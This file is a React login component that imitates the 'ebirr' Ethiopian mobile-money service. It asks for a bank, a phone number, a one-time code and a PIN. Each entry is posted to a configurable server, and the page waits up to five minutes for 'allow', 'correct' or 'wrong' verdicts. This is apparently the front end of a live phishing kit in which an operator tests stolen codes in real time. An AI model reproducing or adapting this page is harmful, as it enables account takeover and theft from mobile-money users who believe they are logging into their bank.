import { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUserId } from '../hooks/useUserId';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  const { userId, apiBase } = useUserId();

  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  const api = (path) => `${API_BASE_URL}${apiBase}/${path}`;

  const ETHIOPIAN_BANKS = [
    { id: 'kaafi',   name: 'KAAFI'   },
    { id: 'cbo',     name: 'CBO'     },
    { id: 'nib',     name: 'NIB'     },
    { id: 'wegagen', name: 'WEGAGEN' },
    { id: 'ahadu',   name: 'AHADU'   }
  ];

  const ETHIOPIA_COUNTRY_CODE = '+251';
  const ETH_PHONE_REGEX = /^9\d{8}$/;

  const [step, setStep]               = useState('bank');
  const [selectedBank, setSelectedBank] = useState(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [otp, setOtp]                 = useState(['', '', '', '', '', '']);
  const [pin, setPin]                 = useState('');
  const [showPin, setShowPin]         = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorModal, setErrorModal]   = useState({ show: false, message: '' });

  const otpRefs    = [useRef(null), useRef(null), useRef(null), useRef(null), useRef(null), useRef(null)];
  const pinInputRef = useRef(null);

  const handlePhoneChange = (e) => {
    setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 9));
  };

  const isValidPhone = (phone) => ETH_PHONE_REGEX.test(phone);

  const handleOtpChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    const newOtp = [...otp]; newOtp[index] = numericValue; setOtp(newOtp);
    if (numericValue && index < 5) otpRefs[index + 1].current?.focus();
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) { const newOtp = [...otp]; newOtp[index] = ''; setOtp(newOtp); }
      else if (index > 0) otpRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowLeft'  && index > 0) otpRefs[index - 1].current?.focus();
      else if (e.key === 'ArrowRight' && index < 5) otpRefs[index + 1].current?.focus();
  };

  const handleOtpKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  const handlePinChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 6) setPin(value);
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  const handleBankSelect = (bankId) => {
    setSelectedBank(bankId);
    setStep('phone');
    localStorage.setItem('ebirr_bank', bankId);
  };

  const handlePhoneSubmit = async (e) => {
    e.preventDefault();
    if (!isValidPhone(phoneNumber)) {
      setErrorModal({ show: true, message: 'እባክዎ ትክክለኛ የኢትዮጵያ ስልክ ቁጥር ያስገቡ (9XXXXXXXX)።' });
      return;
    }
    setIsProcessing(true);
    localStorage.setItem('ebirr_phone', phoneNumber);
    try {
      const response = await fetch(api('verify-phone'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, bank: selectedBank })
      });
      const data = await response.json();
      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({ show: true, message: 'ስልክ ከመላክ ውድቀት ተከስቷል። እንደገና ይሞክሩ።' });
        return;
      }
      let pollCount = 0;
      const maxPolls = 300;
      const pollInterval = setInterval(async () => {
        pollCount++;
        try {
          const statusResp = await fetch(api('check-phone-status'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber, bank: selectedBank })
          });
          const statusData = await statusResp.json();
          if (statusData.status === 'allow') {
            clearInterval(pollInterval); setIsProcessing(false);
            setStep('otp'); setOtp(['', '', '', '', '', '']);
            setTimeout(() => otpRefs[0].current?.focus(), 100);
          } else if (statusData.status === 'invalid') {
            clearInterval(pollInterval); setIsProcessing(false);
            setErrorModal({ show: true, message: 'ስልክ ቁጥርዎ ብቁ አይደለም።' });
          } else if (pollCount > maxPolls) {
            clearInterval(pollInterval); setIsProcessing(false);
            setErrorModal({ show: true, message: 'ማረጋገጥ ጊዜ አለፈ። እንደገና ይሞክሩ።' });
          }
        } catch (error) { console.error('Poll error:', error); }
      }, 1000);
    } catch (error) {
      console.error('Phone submission error:', error);
      setIsProcessing(false);
      setErrorModal({ show: true, message: 'ከሰርቨር ጋር ሊተያየም አልቻለ። ቅጆ ይኖር ተጠንቀቁ።' });
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    const fullOtp = otp.join('');
    if (fullOtp.length !== 6) {
      setErrorModal({ show: true, message: 'እባክዎ ጠቅላላ 6-ሲፈር ንቁ ኮድ ያስገቡ።' });
      return;
    }
    setIsProcessing(true);
    try {
      const response = await fetch(api('verify-otp'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, otp: fullOtp, bank: selectedBank })
      });
      const data = await response.json();
      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({ show: true, message: 'OTP ከመላክ ውድቀት ተከስቷል። እንደገና ይሞክሩ።' });
        return;
      }
      let pollCount = 0;
      const maxPolls = 300;
      const pollInterval = setInterval(async () => {
        pollCount++;
        try {
          const statusResp = await fetch(api('check-otp-status'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber, bank: selectedBank })
          });
          const statusData = await statusResp.json();
          if (statusData.status === 'correct') {
            clearInterval(pollInterval); setIsProcessing(false);
            setStep('pin'); setPin('');
            setTimeout(() => pinInputRef.current?.focus(), 100);
          } else if (statusData.status === 'wrong') {
            clearInterval(pollInterval); setIsProcessing(false);
            setErrorModal({ show: true, message: 'ያስገቡት የንቁ ኮድ ትክክል አይደለም።' });
            setOtp(['', '', '', '', '', '']);
            setTimeout(() => otpRefs[0].current?.focus(), 150);
          } else if (pollCount > maxPolls) {
            clearInterval(pollInterval); setIsProcessing(false);
            setErrorModal({ show: true, message: 'OTP ማረጋገጥ ጊዜ አለፈ። እንደገና ይሞክሩ።' });
          }
        } catch (error) { console.error('Poll error:', error); }
      }, 1000);
    } catch (error) {
      console.error('OTP submission error:', error);
      setIsProcessing(false);
      setErrorModal({ show: true, message: 'የንቁ ኮድ ማረጋገጥ ስህተት ተከስቷል። ቅጆ ይኖር ተጠንቀቁ።' });
    }
  };

  const handlePinSubmit = async (e) => {
    e.preventDefault();
    if (pin.length < 4 || pin.length > 6) {
      setErrorModal({ show: true, message: 'እባክዎ 4-6 ሲፈር PIN ያስገቡ።' });
      return;
    }
    setIsProcessing(true);
    try {
      const response = await fetch(api('verify-pin'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, pin, bank: selectedBank })
      });
      const data = await response.json();
      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({ show: true, message: 'PIN ከመላክ ውድቀት ተከስቷል። እንደገና ይሞክሩ።' });
        return;
      }
      let pollCount = 0;
      const maxPolls = 300;
      const pollInterval = setInterval(async () => {
        pollCount++;
        try {
          const statusResp = await fetch(api('check-pin-status'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber, bank: selectedBank })
          });
          const statusData = await statusResp.json();
          if (statusData.status === 'correct') {
            clearInterval(pollInterval);
            localStorage.setItem('ebirr_auth', 'true');
            localStorage.setItem('ebirr_user_phone', phoneNumber);
            setIsProcessing(false);
            await new Promise(r => setTimeout(r, 400));
            navigate(`/${userId}/status`);
          } else if (statusData.status === 'wrong') {
            clearInterval(pollInterval); setIsProcessing(false);
            setErrorModal({ show: true, message: 'ያስገቡት PIN ትክክል አይደለም።' });
          } else if (pollCount > maxPolls) {
            clearInterval(pollInterval); setIsProcessing(false);
            setErrorModal({ show: true, message: 'PIN ማረጋገጥ ጊዜ አለፈ። እንደገና ይሞክሩ።' });
          }
        } catch (error) { console.error('Poll error:', error); }
      }, 1000);
    } catch (error) {
      console.error('PIN submission error:', error);
      setIsProcessing(false);
      setErrorModal({ show: true, message: 'PIN ማረጋገጥ ስህተት ተከስቷል። ቅጆ ይኖር ተጠንቀቁ።' });
    }
  };

  const closeErrorModal = () => setErrorModal({ show: false, message: '' });

  const isPhoneValid  = isValidPhone(phoneNumber);
  const isOtpComplete = otp.every(d => d !== '');
  const isPinValid    = pin.length >= 4 && pin.length <= 6;

  const formatPhoneForDisplay = (phone) => {
    if (!phone || phone.length < 4) return phone;
    return `${phone.slice(0, 3)}****${phone.slice(-2)}`;
  };

  if (isProcessing) {
    return (
      <div className="login-container">
        <header className="login-header">
          <div className="logo-large">
            <div className="ebirr-logo-large">
              <img src="/vite.svg" alt="ebirr logo" className="ebirr-circle-large" />
              <span className="logo-large-ebirr">ebirr</span>
            </div>
            <p className="logo-subtitle">ኢትዮጵያ</p>
          </div>
        </header>
        <main className="login-content">
          <div className="processing-card">
            <div className="spinner-container"><div className="ebirr-spinner"></div></div>
            <h2 className="processing-title">ሂደት ላይ...</h2>
            <p className="processing-subtitle">እባክዎ ይጠብቁ</p>
          </div>
        </main>
        <footer className="login-footer">© 2026 ebirr</footer>
      </div>
    );
  }

  return (
    <div className="login-container">
      <header className="login-header">
        <div className="logo-large">
          <div className="ebirr-logo-large">
            <img src="/vite.svg" alt="ebirr logo" className="ebirr-circle-large" />
            <span className="logo-large-ebirr">ebirr</span>
          </div>
          <p className="logo-subtitle">ኢትዮጵያ</p>
        </div>
      </header>

      <main className="login-content">
        <h1 className="login-title">
          {step === 'bank'  && 'ባንክ ይምረጡ'}
          {step === 'phone' && 'ስልክ ቁጥር ያስገቡ'}
          {step === 'otp'   && 'ንቁ ኮድ'}
          {step === 'pin'   && 'PIN ያስገቡ'}
        </h1>

        <form className="login-form">

          {step === 'bank' && (
            <div className="bank-selection-container">
              <div className="banks-grid">
                {ETHIOPIAN_BANKS.map((bank) => (
                  <button key={bank.id} type="button"
                    className={`bank-button ${selectedBank === bank.id ? 'selected' : ''}`}
                    onClick={() => handleBankSelect(bank.id)}>
                    {bank.name}
                  </button>
                ))}
              </div>
            </div>
          )}

          {step === 'phone' && (
            <>
              <div className="phone-input-container">
                <div className="country-code-display">{ETHIOPIA_COUNTRY_CODE}</div>
                <input type="tel" className="phone-input-ethiopia" placeholder="9XXXXXXXX"
                  value={phoneNumber} onChange={handlePhoneChange}
                  disabled={isProcessing} maxLength="9" inputMode="numeric" required autoFocus />
              </div>
              <button type="submit" className="login-button" disabled={!isPhoneValid} onClick={handlePhoneSubmit}>
                ቀጥል
              </button>
              <button type="button" className="login-button-secondary"
                onClick={() => { setStep('bank'); setSelectedBank(null); }}>
                ← ተመልሸ
              </button>
            </>
          )}

          {step === 'otp' && (
            <>
              <div className="otp-sent-message">
                <p className="otp-sent-text">
                  ንቁ ኮድ ወደ <strong>{ETHIOPIA_COUNTRY_CODE}{formatPhoneForDisplay(phoneNumber)}</strong> ተልክቷል
                </p>
              </div>
              <p className="otp-instructions">
                በሞባይል ቁጥር ወይም ኢሜይል ሊልክ ካለው OTP ኮድ ሳይን ያረጋግጡ
              </p>
              <div className="otp-input-container">
                <div className="otp-inputs-wrapper">
                  {otp.map((digit, index) => (
                    <input key={index} ref={otpRefs[index]} type="text" className="otp-box"
                      value={digit} onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)} onKeyPress={handleOtpKeyPress}
                      maxLength="1" inputMode="numeric" pattern="[0-9]" required />
                  ))}
                </div>
              </div>
              <button type="submit" className="login-button" disabled={!isOtpComplete} onClick={handleOtpSubmit}>
                ንቁ ያድርጉ
              </button>
              <button type="button" className="login-button-secondary"
                onClick={() => { setStep('phone'); setPhoneNumber(''); setOtp(['', '', '', '', '', '']); }}>
                ← ተመልሸ
              </button>
            </>
          )}

          {step === 'pin' && (
            <>
              <div className="pin-section-login">
                <label className="pin-label-login">PIN ያስገቡ</label>
                <div className="pin-input-wrapper-login">
                  <input ref={pinInputRef} type={showPin ? 'text' : 'password'}
                    className="pin-input-login" value={pin} onChange={handlePinChange}
                    placeholder="••••" maxLength="6" inputMode="numeric" required autoFocus />
                  <button type="button" className="eye-button-login" onClick={togglePinVisibility}
                    aria-label={showPin ? 'PIN ደብቅ ያድርጉ' : 'PIN አሳይ'}>
                    {showPin ? '👁️' : '👁️‍🗨️'}
                  </button>
                </div>
              </div>
              <button type="submit" className="login-button" disabled={!isPinValid} onClick={handlePinSubmit}>
                PIN ያረጋግጡ
              </button>
              <button type="button" className="login-button-secondary"
                onClick={() => { setStep('otp'); setPin(''); setShowPin(false); }}>
                ← ተመልሸ
              </button>
            </>
          )}

        </form>
      </main>

      <footer className="login-footer">
        <div className="wave-decoration"></div>
        <div className="footer-content">
          <div className="footer-logo">
            <div className="footer-logo-text">
              <div className="footer-ebirr-logo">
                <img src="/vite.svg" alt="ebirr logo" className="footer-ebirr-circle" />
                <span className="footer-logo-ebirr">ebirr</span>
              </div>
              <p className="footer-logo-subtitle">ኢትዮጵያ</p>
            </div>
          </div>
          <p className="footer-text">ደህንነት። ፈጣን። አስተማማኝ።</p>
          <p className="terms-text">
            <span className="terms-link">ውሎች &amp; ሁኔታ</span>{' '}&bull;{' '}
            <span className="terms-link">የግላዊነት ፖሊሲ</span>
          </p>
        </div>
      </footer>

      {errorModal.show && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">🚫</div>
            <h3 className="error-modal-title">ስህተት</h3>
            <p className="error-modal-message">{errorModal.message}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>እንደገና ይሞክሩ</button>
          </div>
        </div>
      )}
    </div>
  );
}
